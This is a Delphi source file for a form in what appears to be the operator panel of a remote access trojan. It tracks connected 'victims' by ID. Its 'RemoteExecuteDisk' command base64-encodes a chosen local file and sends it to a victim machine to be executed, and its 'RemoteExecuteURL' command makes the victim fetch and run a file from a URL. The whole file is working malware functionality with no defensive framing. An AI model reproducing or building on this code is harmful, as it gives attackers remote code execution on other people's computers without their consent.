unit FrmExecute;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, sMemo, sButton, sEdit,
  sRadioButton, sGroupBox, System.NetEncoding;

type
  TForm4 = class(TForm)
    sGroupBox1: TsGroupBox;
    sRadioButton1: TsRadioButton;
    sEdit1: TsEdit;
    sRadioButton2: TsRadioButton;
    sEdit2: TsEdit;
    sGroupBox2: TsGroupBox;
    sRadioButton3: TsRadioButton;
    sButton1: TsButton;
    sMemo1: TsMemo;
    procedure sEdit1Click(Sender: TObject);
    procedure sButton1Click(Sender: TObject);
  private
    { Private declarations }
  public
    ThisFormsVictimID: string;
  end;

var
  Form4: TForm4;

implementation

{$R *.dfm}

uses FrmMain;

procedure SendToSelectedClient(const VictimID, Msg: string);
var
  I: Integer;
  NickName: string;
  UserData: TConnectedUserData;
begin
  NickName := VictimID;
  for I := 0 to Form1.ConnectedUsers.Count - 1 do
  begin
    UserData := TConnectedUserData(Form1.ConnectedUsers.Objects[I]);
    if UserData.ID = NickName then
    begin
      Form1.ServerSource.ExecCommand(UserData.Line, 0, BytesOf(Msg), False);
      Exit;
    end;
  end;
end;

procedure TForm4.sButton1Click(Sender: TObject);
var
  bytestream: TBytesStream;
  FileStream: TFileStream;
  DataString: string;
  FilePath: string;
  FileExtension: string;
begin
  if sRadioButton1.Checked = true then
  begin

    // Get the file path from sEdit1.Text
    FilePath := sEdit1.Text;

    // Check if the file path is valid and the file exists
    if FilePath = '' then
    begin
      sMemo1.Lines.Add('Please specify a file path.');
      Exit;
    end;

    if not FileExists(FilePath) then
    begin
      sMemo1.Lines.Add('File not found: ' + FilePath);
      Exit;
    end;

    // Extract the file extension
    FileExtension := ExtractFileExt(FilePath);
    if FileExtension = '' then
    begin
      sMemo1.Lines.Add('File has no extension.');
      Exit;
    end;

    // Proceed with reading the file
    FileStream := TFileStream.Create(FilePath, fmOpenRead);
    try
      bytestream := TBytesStream.Create;
      try
        bytestream.CopyFrom(FileStream, FileStream.Size);
        DataString := TNetEncoding.Base64.EncodeBytesToString(bytestream.Bytes);

        if sRadioButton3.Checked then
        begin
          SendToSelectedClient(ThisFormsVictimID, 'RemoteExecuteDisk|' +
            DataString + '|' + FileExtension);
          sMemo1.Lines.Add('Sending file...');
        end;

      finally
        bytestream.Free;
      end;
    finally
      FileStream.Free;
    end
  end
  else
  begin
    SendToSelectedClient(ThisFormsVictimID, 'RemoteExecuteURL|' + sEdit2.Text);
    sMemo1.Lines.Add('Sending URL...');
  end;
end;

procedure TForm4.sEdit1Click(Sender: TObject);
var
  OpenDialog: TOpenDialog;
begin
  // Create and configure the OpenDialog
  OpenDialog := TOpenDialog.Create(Self);
  try
    OpenDialog.InitialDir := 'C:\Users\Public\Desktop';
    OpenDialog.Filter := 'All Files|*.*';
    // Optional: Set the file filter (e.g., All Files)

    // Show the OpenDialog and check if the user selected a file
    if OpenDialog.Execute then
    begin
      // If the user selects a file, set the full path to Edit4
      sEdit1.Text := OpenDialog.FileName;
    end;
  finally
    OpenDialog.Free; // Free the OpenDialog after use
  end;
end;

end.
